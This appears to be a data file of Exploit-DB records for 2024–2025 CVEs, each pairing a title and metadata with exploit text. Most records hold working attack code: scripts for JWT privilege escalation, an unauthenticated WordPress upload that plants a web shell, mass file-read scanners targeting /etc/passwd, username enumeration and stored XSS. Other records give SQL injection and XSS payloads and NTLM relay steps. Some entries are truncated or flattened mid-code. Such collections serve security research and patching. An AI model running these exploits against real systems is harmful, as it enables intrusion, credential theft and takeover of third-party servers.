headers=headers) if response.statuscode == 200: print(f""[+] Privilege Escalation Successful! The current user is now an admin!"") else: print(f""[-] Failed to escalate privileges. Response: {response.text}"") except Exception as e: print(f""Error during privilege escalation: {e}"") exampl usage: python3 CVE-2024-48827.py -u dummy -p dummy -host 172.22.123.13 -port 3080 -adminuser admin usage if name == ""main"": parser = argparse.ArgumentParser(description='Exploit CVE-2024-48827 to obtain JWT token and escalate privileges.') parser.addargument('-host', '--host', type=str, help='Host or IP address', required=True) parser.addargument('-port', '--port', type=int, help='Port', required=True, default=3080) parser.addargument('-u', '--username', type=str, help='Username for login', required=True) parser.addargument('-p', '--password', type=str, help='Password for login', required=True) parser.addargument('-adminuser', '--adminuser', type=str, help='Admin username to escalate privileges', required=True) args = parser.parseargs() step 1: login token = login(args.host, args.port, args.username, args.password) step 2: craft the admin token if token: newtoken = createnewjwt(token) step 3: Escalate privileges with crafted token. Enjoy! if newtoken: privilegeescalation(args.host, args.port, args.adminuser, new_token)"
CVE-2024-8856,"{""CVE-2024-8856"": 1}",2025-04-06,Backup and Staging by WP Time Capsule 1.22.21 - Unauthenticated Arbitrary File Upload,https://www.exploit-db.com/exploits/52131,"Exploit Title: WordPress Backup and Staging Plugin ≤ 1.21.16 - Arbitrary File Upload to RCE Original Author: Patchstack (hypothetical) Exploit Author: Al Baradi Joy Exploit Date: April 5, 2025 Vendor Homepage: <URL> Software Link: <URL> Version: Up to and including 1.21.16 Tested Versions: 1.21.16 CVE ID: CVE-2024-8856 Vulnerability Type: Arbitrary File Upload / Remote Code Execution Description: The WordPress plugin ""Backup and Staging by WP Time Capsule"" up to version 1.21.16 allows unauthenticated attackers to upload arbitrary files via the upload.php endpoint. This can lead to remote code execution if a PHP file is uploaded and executed directly from the wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/ directory. Proof of Concept: Yes Categories: WordPress Plugin, File Upload, RCE CVSS Score: 9.9 (Critical) CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Notes: Successful exploitation provides shell access as the user running the web server. Ensure target is using the vulnerable plugin version before launching the attack. import requests Banner def displaybanner(): print(""=""*80) print(""Exploit Title: CVE-2024-8856 - WordPress Backup and Staging Plugin Arbitrary File Upload"") print(""Made By Al Baradi Joy"") print(""=""*80) Function to detect if the target supports HTTPS or falls back to HTTP def detectprotocol(domain): httpsurl = f"" <URL> httpurl = f"" <URL> try: response = requests.get(httpsurl, timeout=5, allowredirects=True) if response.statuscode < 400: print(f""[] Target supports HTTPS: {httpsurl}"") return httpsurl except requests.exceptions.RequestException: print(""[!] HTTPS not available, falling back to HTTP."") try: response = requests.get(httpurl, timeout=5, allowredirects=True) if response.statuscode < 400: print(f""[] Target supports HTTP: {httpurl}"") return httpurl except requests.exceptions.RequestException: print(""[] Target is unreachable on both HTTP and HTTPS."") exit(1) Exploit function def exploit(targeturl): targeturl = detectprotocol(targeturl.replace("" <URL> """").replace("" <URL> """").strip()) uploadurl = f""{targeturl}/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload.php"" shellurl = f""{targeturl}/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/shell.php?cmd=whoami"" files = { 'file': ('shell.php', ' ', 'application/x-php') try: print(f""[+] Attempting to upload shell to: {uploadurl}"") response = requests.post(uploadurl, files=files, timeout=10) if response.statuscode == 200: print(f""[] Exploit successful! Webshell available at: {shellurl}"") else: print(f""[] Failed to upload shell. Status code: {response.statuscode}"") except requests.exceptions.ConnectionError: print(""[] Connection failed. Target may be down."") except requests.exceptions.Timeout: print(""[] Request timed out. Target is slow or unresponsive."") except requests.exceptions.RequestException as e: print(f""[] Unexpected error: {e}"") Main execution if name == ""main"": displaybanner() target = input(""[?] Enter the target URL (without http/https): "").strip() exploit(target)"
CVE-2024-9458,"{""CVE-2024-9458"": 1}",2025-04-06,Reservit Hotel 2.1 - Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52133,"Exploit Title: Reservit Hotel < 3.0 - Admin+ Stored XSS Date: 2024-10-01 Exploit Author: Ilteris Kaan Pehlivan Vendor Homepage: <URL> Version: Reservit Hotel 2.1 Tested on: Windows, WordPress, Reservit Hotel < 3.0 CVE : CVE-2024-9458 The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed (for example in multisite setup). 1. Install and activate Reservit Hotel plugin. 2. Go to Reservit hotel > Content 3. Add the following payload to the Button text > French field sane save: "" style=animation-name:rotation onanimationstart=alert(/XSS/)// 4. The XSS will trigger upon saving and when any user will access the content dashboard again References: <URL> <URL>"
CVE-2024-7801,"{""CVE-2024-7801"": 1}",2025-04-05,Microchip TimeProvider 4100 Grandmaster (Data plot modules) 2.4.6 - SQL Injection,https://www.exploit-db.com/exploits/52122,"Exploit Title: Microchip TimeProvider 4100 Grandmaster (Data plot modules) 2.4.6 - SQL Injection Exploit Author: Armando Huesca Prida, Marco Negro Discovered By: Armando Huesca Prida, Marco Negro, Antonio Carriero, Vito Pistillo, Davide Renna, Manuel Leone, Massimiliano Brolli Date of Disclosure: 27/06/2024 Date of CVE Publication: 4/10/2024 Exploit Publication: 11/10/2024 Vendor Homepage: <URL> Version: Firmware release 1.0 through 2.4.7 Tested on: Firmware release 2.3.12 CVE: CVE-2024-7801 External References: URL: <URL> URL: <URL> URL: <URL> URL: <URL> Vulnerability Description: The TimeProvider 4100 Grandmaster firmware has a SQL injection vulnerability in the “getchartdata” web resource, specifically the “channelId” parameter is inserted directly into the SQL query (SQLite) at the table's name query parameter from which the FROM operation is performed. Unauthenticated threat actors can manipulate queries to execute malicious SQL commands against the device. Example of Malicious SQL Payload: SELECT%20sql%202,%203,%204,%205,%206,%207,%208,%209,%2010,%2011,%2012,%2013,%2014,%2015,%2016,%2017,%2018,%2019,%2020,%2021,%2022,%2023,%2024,%2025,%2026,%2027,%2028,%2029,%2030,%2031,%2032,%2033,%2034,%2035,%2036,%2037,%2038,%2039,%2040,%2041,%2042,%2043,%2044,%2045,%2046,%2047,%2048,%2049,%2050,%2051,%2052,%2053,%2054,%2055,%2056,%2057,%2058,%2059,%2060,%2061,%2062,%2063,%2064,%2065,%2066,%2067,%2068%20FROM%20sqlite_master$20WHERE&20type='table'$20LIMIT%201%20OFFSET%200-- Proof of Concept -"
CVE-2024-35133,"{""CVE-2024-35133"": 1}",2025-04-05,IBM Security Verify Access 10.0.0 - Open Redirect during OAuth Flow,https://www.exploit-db.com/exploits/52123,"Exploit Title : IBM Security Verify Access 10.0.0 - Open Redirect during OAuth Flow = < Table of Contents > = 0. Overview 1. Detailed Description 2. Proof Of Concept 3. Solution 4. Disclosure Timeline 5. References 6. Credits 7. Legal Notices = < 0. Overview > = Revision: 1.0 Impact: By persuading a victim to visit a specially crafted Web site, a remote attacker could exploit this vulnerability to spoof the URL displayed to redirect a user to a malicious Web site that would appear to be trusted. This could allow the attacker to obtain highly sensitive information or conduct further attacks against the victim. Severity: NIST: High IBM: Medium CVSS Score: NIST 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) IBM 6.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:N) CVE-ID: CVE-2024-35133 Vendor: IBM Affected Products: IBM Security Verify Access IBM Security Verify Access Docker Affected Versions: 10.0.0 - 10.0.8 Product Description: IBM Security Verify Access is a complete authorization and network security policy management solution. It provides end-to-end protection of resources over geographically dispersed intranets and extranets. In addition to state-of-the-art security policy management, IBM Security Verify Access provides authentication, authorization, data security, and centralized resource management capabilities. IBM Security Verify Access offers the following features: Authentication ~ Provides a wide range of built-in authenticators and supports external authenticators. Authorization ~ Provides permit and deny decisions for protected resources requests in the secure domain through the authorization API. Data security and centralized resource management ~ Manages secure access to private internal network-based resources by using the public Internet's broad connectivity and ease of use with a corporate firewall system. = < 1. Detailed Description > = During a Penetration Test of the OAuth flow for a client, it was found an Open Redirect vulnerability that can led to the leakage of the OAuth ""code"" variable. It was possible to bypass the parser's logic responsible for verifying the correctness and the validity of the ""redirecturi"" parameter during an OAuth flow by leveraging RFC 3986 (3.2.1) providing a username and password directly in the Uniform Resource Identifier (URI). By providing as the ""username"" field a legitimate and expected domain, it was possible to bypass the whitelist filter used by ""IBM Security Verify Access"" and cause an Open Redirect to any arbitrary domain controlled by the attacker, not only altering the expected flow and redirect a user to a malicious Web site that would appear to be trusted. This could allow the attacker to obtain highly sensitive like the OAuth ""code"" token or conduct further attacks against the victim = < 2. Proof of Concepts > = = REQUEST = GET /oauth/oauth20/authorize?responsetype=code&clientid=[REDACTED]&state=001710863806728MPUw0xFSj&REDACTEDuri= <URL> HTTP/1.1 Host: [REDACTED] User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close = RESPONSE = HTTP/1.1 302 Found content-language: en-US date: Tue, 19 Mar 2024 16:04:35 GMT location: <URL> p3p: CP=""NON CUR OTPi OUR NOR UNI"" x-frame-options: DENY x-content-type-options: nosniff cache-control: no-store x-xss-protection: 1; mode=block x-permitted-cross-domain-policies: none cross-origin-resource-policy: same-site content-security-policy: frame-ancestors 'none' referrer-policy: no-referrer-when-downgrade strict-transport-security: max-age=31536000; includeSubDomains pragma: no-cache Content-Length: 0. = < 3. Solution > = Refer to IBM Security Bulletin 7166712 for patch, upgrade or suggested workaround information. See ""References"" for more details. = < 4. Disclosure Timeline > = 19/03/2024 - Vulnerability discovered by the Security Researcher (Giulio Garzia) 21/03/2024 - Vulnerability shared with the client who committed the Penetration Test on his infrastructure, relying on IBM SVA 02/04/2024 - Vulnerability shared with IBM 02/04/2024 - Vulnerability taken over by IBM 14/05/2024 - Vulnerability confirmed by IBM 18/07/2024 - Pre-release provided by IBM to the customer to verify the resolution of the vulnerability 27/08/2024 - Security Bulletin and vulnerability shared by IBM = < 5. References > = (1) <URL> (2) <URL> (3) <URL> (4) <URL> = < 6. Credits > = This vulnerability was discovered and reported by: Giulio Garzia 'Ozozuz' Contacts: <URL> <URL> = < 7. Legal Notices > = Copyright (c) 2024 Giulio Garzia ""Ozozuz"" Permission is granted for the redistribution of this alert electronically. It may not be edited in any way without mine express written consent. If you wish to reprint the whole or any part of this alert in any other medium other than electronically, please email me for permission. Disclaimer: The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on,this information."
CVE-2025-29927,"{""CVE-2025-29927"": 1}",2025-04-05,Next.js Middleware 15.2.2 -  Authorization Bypass,https://www.exploit-db.com/exploits/52124,Exploit Title: Next.js Middleware Bypass Vulnerability (CVE-2025-29927) Date: 2025-03-26 Exploit Author: kOaDT Vendor Homepage: <URL> Software Link: <URL> Version: 13.0.0 - 13.5.8 / 14.0.0 - 14.2.24 / 15.0.0 - 15.2.2 / 11.1.4 - 12.3.4 Tested on: Ubuntu 22.04.5 LTS CVE: CVE-2025-29927
CVE-2025-2294,"{""CVE-2025-2294"": 1}",2025-04-05,Kubio AI Page Builder 2.5.1 - Local File Inclusion (LFI),https://www.exploit-db.com/exploits/52125,"Exploit Title: Kubio AI Page Builder <= 2.5.1 - Local File Inclusion (LFI) Date: 2025-04-04 Exploit Author: Sheikh Mohammad Hasan ( <URL> Vendor Homepage: <URL> Software Link: <URL> Reference: <URL> Version: <= 2.5.1 Tested on: WordPress 6.4.2 (Ubuntu 22.04 LTS) CVE: CVE-2025-2294 Description: The Kubio AI Page Builder plugin for WordPress contains a Local File Inclusion vulnerability in the kubio_hybrid_theme_load_template function. This allows unauthenticated attackers to read arbitrary files via path traversal. Can lead to RCE when combined with file upload capabilities. import argparse import re import requests from urllib.parse import urljoin from concurrent.futures import ThreadPoolExecutor class Colors: HEADER = '\033[95m' OKBLUE = '\033[94m' OKGREEN = '\033[92m' WARNING = '\033[93m' FAIL = '\033[91m' ENDC = '\033[0m' BOLD = '\033[1m' UNDERLINE = '\033[4m' def parseversion(versionstr): parts = list(map(int, versionstr.split('.') while len(parts) < 3: parts.append(0) return tuple(parts[:3]) def checkpluginversion(targeturl): readmeurl = urljoin(targeturl, 'wp-content/plugins/kubio/readme.txt') try: response = requests.get(readmeurl, timeout=10) if response.statuscode == 200: versionmatch = re.search(r'Stable tag:\s*([\d.]+)', response.text, re.I) if not versionmatch: return False, ""Version not found"" versionstr = versionmatch.group(1).strip() try: parsedversion = parseversion(versionstr) except ValueError: return False, f""Invalid version format: {versionstr}"" return parsedversion <= (2, 5, 1), versionstr return False, f""HTTP Error {response.statuscode}"" except Exception as e: return False, f""Connection error: {str(e)}"" def exploitvulnerability(targeturl, filepath, showcontent=False): exploiturl = f""{targeturl}/?kubio-site-edit-iframe-preview=1&kubio-site-edit-iframe-classic-template={filepath}"" try: response = requests.get(exploiturl, timeout=10) if response.statuscode == 200: if showcontent: print(f""\n{Colors.OKGREEN}[+] File content from {targeturl}:{Colors.ENDC}"") print(Colors.OKBLUE + response.text + Colors.ENDC) return True return False except Exception as e: return False def processurl(url, filepath, showcontent, outputfile): print(f""{Colors.HEADER}[] Checking: {url}{Colors.ENDC}"") is_vuln, version_info = check_plugin_version(url) if is_vuln: print(f""{Colors.OKGREEN}[+] Vulnerable: {url} (Version: {version_info}){Colors.ENDC}"") exploit_success = exploit_vulnerability(url, file_path, show_content) if output_file and exploit_success: with open(output_file, 'a') as f: f.write(f""{url}\n"") return url if exploit_success else None else: print(f""{Colors.FAIL}[-] Not vulnerable: {url} ({version_info}){Colors.ENDC}"") return None def main(): parser = argparse.ArgumentParser(description=""Kubio Plugin Vulnerability Scanner"") group = parser.add_mutually_exclusive_group(required=True) group.add_argument(""-u"", ""--url"", help=""Single target URL (always shows file content)"") group.add_argument(""-l"", ""--list"", help=""File containing list of URLs"") parser.add_argument(""-f"", ""--file"", default=""../../../../../../../../etc/passwd"", help=""File path to exploit (default: ../../../../../../../../etc/passwd)"") parser.add_argument(""-o"", ""--output"", help=""Output file to save vulnerable URLs"") parser.add_argument(""-v"", ""--verbose"", action=""store_true"", help=""Show file contents when using -l/--list mode"") parser.add_argument(""-t"", ""--threads"", type=int, default=5, help=""Number of concurrent threads for list mode"") args = parser.parse_args() Determine operation mode if args.url: Single URL mode - always show content process_url(args.url, args.file, show_content=True, output_file=args.output) elif args.list: List mode - handle multiple URLs with open(args.list, 'r') as f: urls = [line.strip() for line in f.readlines() if line.strip()] print(f""{Colors.BOLD}[] Starting scan with {len(urls)} targets.{Colors.ENDC}"") with ThreadPoolExecutor(maxworkers=args.threads) as executor: futures = [] for url in urls: futures.append( executor.submit( processurl, url, args.file, args.verbose, args.output vulnerableurls = [future.result() for future in futures if future.result()] print(f""\n{Colors.BOLD}[*] Scan complete!{Colors.ENDC}"") print(f""{Colors.OKGREEN}[+] Total vulnerable URLs found: {len(vulnerableurls)}{Colors.ENDC}"") if args.output: print(f""{Colors.OKBLUE}[+] Vulnerable URLs saved to: {args.output}{Colors.ENDC}"") if name == ""main"": main()"
CVE-2024-1234,"{""CVE-2024-1234"": 1}",2025-04-05,Exclusive Addons for Elementor 2.6.9 - Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52126,"Exploit Title: Exclusive Addons for Elementor ≤ 2.6.9 - Authenticated Stored Cross-Site Scripting (XSS) Original Author: Wordfence Security Team Exploit Author: Al Baradi Joy Exploit Date: March 13, 2024 Vendor Homepage: <URL> Software Link: <URL> Version: Up to and including 2.6.9 Tested Versions: 2.6.9 CVE ID: CVE-2024-1234 Vulnerability Type: Stored Cross-Site Scripting (XSS) Description: The Exclusive Addons for Exclusive Addons for Elementor for WordPress, in versions up to and including 2.6.9, is vulnerable to stored cross-site scripting (XSS) via the 's' parameter. Due to improper input sanitization and output escaping, an attacker with contributor-level permissions or higher can inject arbitrary JavaScript that executes when a user views the affected page. Proof of Concept: Yes Categories: Web Application, Cross-Site Scripting (XSS), WordPress Plugin CVSS Score: 6.5 (Medium) CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N Notes: To exploit this vulnerability, an attacker needs an authenticated user role with permission to edit posts. Injecting malicious JavaScript can lead to session hijacking, redirections, and other client-side attacks. #Exploit Code: `python import requests from urllib.parse import urlparse Banner def displaybanner(): exploittitle = ""CVE-2024-1234: Exclusive Addons for Elementor Plugin Stored XSS"" print(""=""50) print(f""Exploit Title: {exploit_title}"") print(""Made By Al Baradi Joy"") print(""=""50) Function to validate URL def validateurl(url): Check if the URL is valid and well-formed parsedurl = urlparse(url) if not parsedurl.scheme in [""http"", ""https""]: print(""Error: Invalid URL. Please ensure the URL starts with <URL> <URL> return False return True Function to exploit XSS vulnerability def exploitxss(targeturl): The XSS payload to inject payload = "" "" The parameters to be passed (in this case, we are exploiting the 's' parameter) params = { 's': payload Send a GET request to the vulnerable URL with the payload try: print(f""Sending exploit to: {targeturl}"") response = requests.get(targeturl, params=params, timeout=10) Check if the status code is OK and if the payload is reflected in the response if response.statuscode == 200 and payload in response.text: print(f""XSS exploit successful! Payload: {payload}"") elif response.statuscode != 200: print(f""Error: Received non-OK status code {response.statuscode}"") else: print(""Exploit failed or no XSS reflected."") except requests.exceptions.RequestException as e: print(f""Error: Request failed - {e}"") except Exception as e: print(f""Unexpected error: {e}"") if name == ""main"": Display banner displaybanner() Ask the user for the target URL targeturl = input(""Enter the target URL: "").strip() Validate the provided URL if validateurl(targeturl): Call the exploit function if URL is valid exploitxss(targeturl)"
CVE-2023-5360,"{""CVE-2023-5360"": 1}",2025-04-05,Royal Elementor Addons and Templates 1.3.78 - Unauthenticated Arbitrary File Upload,https://www.exploit-db.com/exploits/52127,"Exploit Title: WordPress Plugin Royal Elementor Addons <= 1.3.78 - Unauthenticated Arbitrary File Upload (RCE) Date: 2025-04-04 Exploit Author: Sheikh Mohammad Hasan ( <URL> Vendor Homepage: <URL> Software Link: <URL> Version: <= 1.3.78 Tested on: WordPress 6.3.1, Royal Elementor Addons 1.3.78, Ubuntu 22.04 + Apache2 + PHP 8.1 CVE: CVE-2023-5360 Description: The Royal Elementor Addons and Templates WordPress plugin before 1.3.79 does not properly validate uploaded files, which allows unauthenticated users to upload arbitrary files (such as .php), leading to Remote Code Execution (RCE). import requests import json import re import argparse import tempfile from urllib.parse import urljoin from rich.console import Console requests.packages.urllib3.disablewarnings() console = Console() def getnonce(target): try: r = requests.get(target, verify=False, timeout=10) m = re.search(r'var\s+WprConfig\s=\s({.*?});', r.text) if m: nonce = json.loads(m.group(1)).get(""nonce"") return nonce except: pass return None def uploadshell(target, nonce, filepath): ajaxurl = urljoin(target, ""/wp-admin/admin-ajax.php"") with open(filepath, ""rb"") as f: files = {""uploaded_file"": ("""
CVE-2024-9054,"{""CVE-2024-9054"": 1}",2025-04-04,Microchip TimeProvider 4100 (Configuration modules) 2.4.6 - OS Command Injection,https://www.exploit-db.com/exploits/52119,"Exploit Title: Microchip TimeProvider 4100 (Configuration modules) 2.4.6 - OS Command Injection Exploit Author: Armando Huesca Prida Discovered By: Armando Huesca Prida, Marco Negro, Antonio Carriero, Vito Pistillo, Davide Renna, Manuel Leone, Massimiliano Brolli Date of Disclosure: 27/06/2024 Date of CVE Publication: 4/10/2024 Exploit Publication: 10/10/2024 Vendor Homepage: <URL> Version: Firmware release 1.0 through 2.4.7 Tested on: Firmware release 2.3.12 CVE: CVE-2024-9054 External References: URL: <URL> URL: <URL> URL: <URL> URL: <URL> Vulnerability Description: A Remote Code Execution (RCE) vulnerability exists in the ""secretkey"" XML tag in the Microchip TimeProvider 4100 device's configuration file. Once the configuration file containing the malicious payload is loaded by the device, after first attempt of login the payload will execute resulting in remote code execution. Exploitation Steps: 1- Perform login into the device's management web interface. 2- Download the device's configuration file. 3- Substitute the ""secretkey"" value with the malicious payload. 4- Save the new configuration file containing the OS command to be executed. 5- Restore and submit the new configuration. 6- Attempt of login using any active service like SSH/Telnet/Console will trigger the malicious payload. Example of malicious XML config file: [.] [.] 192.168.1.1 ping 192.168.1.20 [.] [.] [.] Proof of Concept -"
CVE-2024-43687,"{""CVE-2024-43687"": 1}",2025-04-04,Microchip TimeProvider 4100 Grandmaster (Banner Config Modules) 2.4.6 - Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52120,"Exploit Title: Microchip TimeProvider 4100 Grandmaster (Banner Config Modules) 2.4.6 - Stored Cross-Site Scripting (XSS) Exploit Author: Armando Huesca Prida Discovered By: Armando Huesca Prida, Marco Negro, Antonio Carriero, Vito Pistillo, Davide Renna, Manuel Leone, Massimiliano Brolli Date of Disclosure: 27/06/2024 Date of CVE Publication: 4/10/2024 Exploit Publication: 10/10/2024 Vendor Homepage: <URL> Version: Firmware release 1.0 through 2.4.7 Tested on: Firmware release 2.3.12 CVE: CVE-2024-43687 External References: URL: <URL> URL: <URL> URL: <URL> URL: <URL> Vulnerability Description: The TimeProvider 4100 grandmaster firmware has a stored Cross-Site Scripting (XSS) vulnerability in the custom banner configuration field. A threat actor that exploits this vulnerability is able to execute arbitrary scripts in any user context. Exploitation Steps: 1- Log in to the device's web management interface. 2- Open the banner configuration panel. 3- Select the ""custom banner"" feature. 4- Insert the malicious JavaScript payload. 5- Apply and save the system configuration containing the custom banner. 6- Victims who connect to the device's web management interface will execute the malicious payload in their browser. Example of malicious JavaScript payload: Proof of Concept -"
CVE-2024-42640,"{""CVE-2024-42640"": 1}",2025-04-04,Angular-Base64-Upload Library 0.1.20 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52121,Exploit Title: Angular-Base64-Upload Library 0.1.20 - Remote Code Execution (RCE) Date: 10 October 2024 Discovered by : Ravindu Wickramasinghe | rvz () Exploit Author: Ravindu Wickramasinghe | rvz () Vendor Homepage: <URL> Software Link: <URL> Version: prior to v0.1.21 Tested on: Arch Linux CVE : CVE-2024-42640 Severity: Critical - 10.0 (CVSS 4.0) Github Link : <URL> Blog Post : <URL> DISCLAIMER: This proof-of-concept (
CVE-2025-30208,"{""CVE-2025-30208"": 1}",2025-04-03,Vite 6.2.2 - Arbitrary File Read,https://www.exploit-db.com/exploits/52111,"Exploit Title: Vite Arbitrary File Read - CVE-2025-30208 Date: 2025-04-03 Exploit Author: Sheikh Mohammad Hasan ( <URL> Vendor Homepage: <URL> Software Link: <URL> Version: <= 6.2.2, <= 6.1.1, <= 6.0.11, <= 5.4.14, <= 4.5.9 Tested on: Ubuntu Reference: <URL> # <URL> CVE : CVE-2025-30208 Description Vite, a provider of frontend development tooling, has a vulnerability in versions prior to 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10. denies access to files outside of Vite serving allow list. Adding ?raw?? or ?import&raw?? to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as ? are removed in several places, but are not accounted for in query string regexes. The contents of arbitrary files can be returned to the browser. Only apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) are affected. Versions 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10 fix the issue. import requests import argparse import urllib3 from colorama import Fore, Style Disable SSL warnings urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) def checkvulnerability(target, filepath, verbose=False, output=None): url = f""{target}{filepath}?raw"" print(f""{Fore.CYAN}[*] Testing: {url}{Style.RESETALL}"") try: response = requests.get(url, timeout=5, verify=False) Ignore SSL verification if response.statuscode == 200 and response.text: vulnmessage = f""{Fore.GREEN}[+] Vulnerable : {url}{Style.RESETALL}"" print(vulnmessage) if verbose: print(f""\n{Fore.YELLOW}- File Content Start -{Style.RESETALL}"") print(response.text[:500]) Print first 500 characters for safety print(f""{Fore.YELLOW}- File Content End -{Style.RESETALL}\n"") if output: with open(output, 'a') as f: f.write(f""{url}\n"") else: print(f""{Fore.RED}[-] Not vulnerable or file does not exist: {url}{Style.RESETALL}"") except requests.exceptions.RequestException as e: print(f""{Fore.YELLOW}[!] Error testing {url}: {e}{Style.RESETALL}"") def checkmultipledomains(filepath, filetoread, verbose, output): try: with open(filetoread, 'r') as file: domains = file.readlines() for domain in domains: domain = domain.strip() if domain: checkvulnerability(domain, filepath, verbose, output) except FileNotFoundError: print(f""{Fore.RED}[!] Error: The file '{filetoread}' does not exist.{Style.RESETALL}"") if name == ""main_"": parser = argparse.ArgumentParser(description="""
CVE-2024-38200,"{""CVE-2024-38200"": 1}",2025-04-03,Microsoft Office 2019 MSO Build 1808 - NTLMv2 Hash Disclosure,https://www.exploit-db.com/exploits/52113,"Exploit Title: Microsoft Office 2019 MSO Build 1808 - NTLMv2 Hash Disclosure Exploit Author: Metin Yunus Kandemir Vendor Homepage: <URL> Software Link: <URL> Details: <URL> Version: Microsoft Office 2019 MSO Build 1808 (16.0.10411.20011), Microsoft 365 MSO (Version 2403 Build 16.0.17425.20176) Tested against: Windows 11 CVE: CVE-2024-38200 Description MS Office URI schemes allow for fetching a document from remote source. MS URI scheme format is '< scheme-name >:< command-name >""|""< command-argument-descriptor > ""|""< command-argument >' . Example: ms-word:ofe|u| <URL> When the URI ""ms-word:ofe|u| <URL> is invoked from a victim computer. This behaviour is abused to capture and relay NTLMv2 hash over SMB and HTTP. For detailed information about capturing a victim user's NTLMv2 hash over SMB, you can also visit <URL> Proof Of Concept If we add a DNS A record and use this record within the Office URI, Windows will consider the hostname as part of the Intranet Zone. In this way, NTLMv2 authentication occurs automatically and a standard user can escalate privileges without needing a misconfigured GPO. Any domain user with standard privileges can add a non-existent DNS record so this attack works with default settings for a domain user. 1. Add a DNS record to resolve hostname to attacker IP address which runs ntlmrelayx. It takes approximately 5 minutes for the created record to start resolving. $ python dnstool.py -u 'unsafe.local\testuser' -p 'pass' -r 'attackerhost' --action 'add' --data [attacker-host-IP] [DC-IP] --zone unsafe.local 2. Fire up ntlmrelayx with following command $ python ntlmrelayx.py -t ldap://DC-IP-ADDRESS --escalate-user testuser --http-port 8080 3. Serve following HTML file using Apache server. Replace hostname with added record (e.g. attackerhost). Microsoft Office 4. Send the URL of the above HTML file to a user with domain admin privileges. You should check whether the DNS record is resolved with the ping command before sending the URL. When the victim user navigates to the URL, clicking the 'Open' button is enough to capture the NTLMv2 hash. (no warning!) 5. The captured NTLMv2 hash over HTTP is relayed to Domain Controller with ntlmrelayx. As a result, a standard user can obtain DCSync and Enterprise Admins permissions under the default configurations with just two clicks."
CVE-2024-44762,"{""CVE-2024-44762"": 1}",2025-04-03,Webmin Usermin 2.100 - Username Enumeration,https://www.exploit-db.com/exploits/52114,"Exploit Title: Webmin Usermin 2.100 - Username Enumeration Date: 10.02.2024 Exploit Author: Kjesper Vendor Homepage: <URL> Software Link: <URL> Version: <= 2.100 Tested on: Kali Linux CVE: CVE-2024-44762 # <URL> #!/usr/bin/python3 # -- coding: utf-8 -- Usermin - Username Enumeration (Version 2.100) Usage: UserEnumUsermin.py -u HOST -w WORDLISTUSERS Example: UserEnumUsermin.py -u <URL> -w users.txt import requests import json import requests import argparse import sys from urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disablewarnings(category=InsecureRequestWarning) parser = argparse.ArgumentParser() parser.addargument(""-u"", ""--url"", help = ""use -u with the url to the host of usermin, EX: \""-u <URL> parser.addargument(""-w"", ""--wordlistusers"", help = ""use -w with the username wordlist, EX: \""-w users.txt\"""") args = parser.parseargs() if len(sys.argv) != 5: print(""Please provide the -u for URL and -w for the wordlist containing the usernames"") print(""EX: python3 UsernameEnum.py -u <URL> -w users.txt"") exit() usernameFile = open(args.wordlistusers, 'r') dataUsername = usernameFile.read() usernameFileIntoList = dataUsername.split(""\n"") usernameFile.close() for i in usernameFileIntoList: newHeaders = {'Content-type': 'application/x-www-form-urlencoded', 'Referer': '%s/passwordchange.cgi' % args.url} params = {'user':i, 'pam':'', 'expired':'2', 'old':'fakePassword', 'new1':'password', 'new2':'password'} response = requests.post('%s/password_change.cgi' % args.url, data=params, verify=False, headers=newHeaders) if ""Failed to change password: The current password is incorrect."" in response.text: print(""Possible user found with username: "" + i) if ""Failed to change password: Your login name was not found in the password file!"" not in response.text and ""Failed to change password: The current password is incorrect."" not in response.text: print(""Application is most likely not vulnerable and are therefore quitting."") exit() comment out line 33-35 if you would still like to try username enumeration."
CVE-2024-4007,"{""CVE-2024-4007"": 1}",2025-04-03,ABB Cylon Aspect 3.07.01 - Hard-coded Default Credentials,https://www.exploit-db.com/exploits/52112,"Exploit Title : ABB Cylon Aspect 3.07.01 - Hard-coded Default Credentials Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.07.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller is operating with default and hard-coded credentials contained in install package while exposed to the Internet. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 